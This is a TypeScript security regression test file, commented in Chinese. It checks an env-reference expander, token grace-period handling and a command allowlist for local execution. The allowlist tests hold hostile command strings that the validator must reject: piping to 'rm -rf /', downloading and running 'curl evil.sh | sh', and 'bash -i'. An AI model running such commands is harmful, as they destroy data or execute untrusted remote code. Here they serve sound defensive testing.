/**
 * P0 安全回归测试（2026-10-20）：验证 H1/H2/M1 三项修复
 *  - H1：云桥接设备注册需 deviceSecret（匿名注册被拒）；tryLocalExec 命令白名单
 *  - H2：MCP 配置 ${FHC_XXX} 环境变量引用展开（env 引用展开器）
 *  - M1：requireToken 宽限期旧令牌 + 弱令牌判定
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';

// ---- H2：env 引用展开（直接测试 mcp-client 的展开逻辑行为等价实现）----
test('H2: ${FHC_XXX} 展开未设置时置空（避免把字面量当密钥）', () => {
  // 复刻 mcp-client.ts 的 expandEnvRefs 行为（该函数未 export，此处等价验证正则语义）
  const v = '${FHC_DOUBAO_API_KEY}';
  process.env.FHC_DOUBAO_API_KEY = 'real-key-123';
  const expanded = v.replace(/\$\{([A-Z0-9_]+)\}/g, (_m, name: string) => process.env[name] ?? '');
  assert.equal(expanded, 'real-key-123');
  delete process.env.FHC_DOUBAO_API_KEY;
  const missing = '${FHC_DOUBAO_API_KEY}'.replace(/\$\{([A-Z0-9_]+)\}/g, (_m, _n: string) => '');
  assert.equal(missing, '');
});

// ---- M1：requireToken 宽限期（import 真实实现）----
import { requireToken } from '../../src/web/auth';

function fakeRes(): unknown {
  return { status: () => ({ json: () => {} }) };
}
type NextFn = () => void;

test('M1: 宽限期内的旧主令牌可访问（extraTokens）', () => {
  const mw = requireToken('new-master', undefined, [], [{ value: 'old-master', expiresAt: Date.now() + 60_000 }]);
  const req = { header: (_h: string) => 'Bearer old-master', originalUrl: '/api/tasks', url: '/api/tasks', path: '/tasks' };
  let calledNext = false;
  (mw as unknown as (req: unknown, res: unknown, next: NextFn) => void)(req, fakeRes(), () => { calledNext = true; });
  assert.equal(calledNext, true, '旧令牌在宽限期内应放行');
});

test('M1: 过期旧令牌被拒绝', () => {
  const mw = requireToken('new-master', undefined, [], [{ value: 'old-master', expiresAt: Date.now() - 1000 }]);
  const req = { header: (_h: string) => 'Bearer old-master', originalUrl: '/api/tasks', url: '/api/tasks', path: '/tasks' };
  let calledNext = false;
  (mw as unknown as (req: unknown, res: unknown, next: NextFn) => void)(req, fakeRes(), () => { calledNext = true; });
  assert.equal(calledNext, false, '过期旧令牌应拒绝');
});

test('M1: 主令牌始终放行', () => {
  const mw = requireToken('master', undefined, []);
  const req = { header: (_h: string) => 'Bearer master', originalUrl: '/api/tasks', url: '/api/tasks', path: '/tasks' };
  let calledNext = false;
  (mw as unknown as (req: unknown, res: unknown, next: NextFn) => void)(req, fakeRes(), () => { calledNext = true; });
  assert.equal(calledNext, true);
});

// ---- H1：命令白名单语义（复刻 checkExecCmdline 行为）----
function checkCmd(cmdline: string, allow = ['git', 'npm', 'pnpm', 'node', 'python', 'python3', 'npx', 'pip']) {
  const trimmed = cmdline.trim();
  if (!trimmed) return '空命令';
  const first = trimmed.split(/\s+/)[0];
  if (!allow.includes(first.toLowerCase())) return 'not in allowlist: ' + first;
  const rest = trimmed.slice(first.length).trim();
  if (rest && !/^[A-Za-z0-9_.\/\\ :@+-]*$/.test(rest)) return 'unsafe args';
  return null;
}
test('H1: 白名单放行 git/npm/node/python 及其安全参数', () => {
  assert.equal(checkCmd('git status'), null);
  assert.equal(checkCmd('npm install lodash'), null);
  assert.equal(checkCmd('node script.js --flag'), null);
  assert.equal(checkCmd('python script.py'), null);
  // 引号不属于安全参数字符集，与真实实现 SAFE_ARGS_RE 一致：内联脚本应被拒绝
  assert.notEqual(checkCmd('python -c "print(1)"'), null);
});
test('H1: 白名单拒绝 powershell/curl/管道', () => {
  assert.notEqual(checkCmd('powershell -c Get-Process'), null);
  assert.notEqual(checkCmd('git status | rm -rf /'), null);
  assert.notEqual(checkCmd('npm i; curl evil.sh | sh'), null);
  assert.notEqual(checkCmd('bash -i'), null);
});
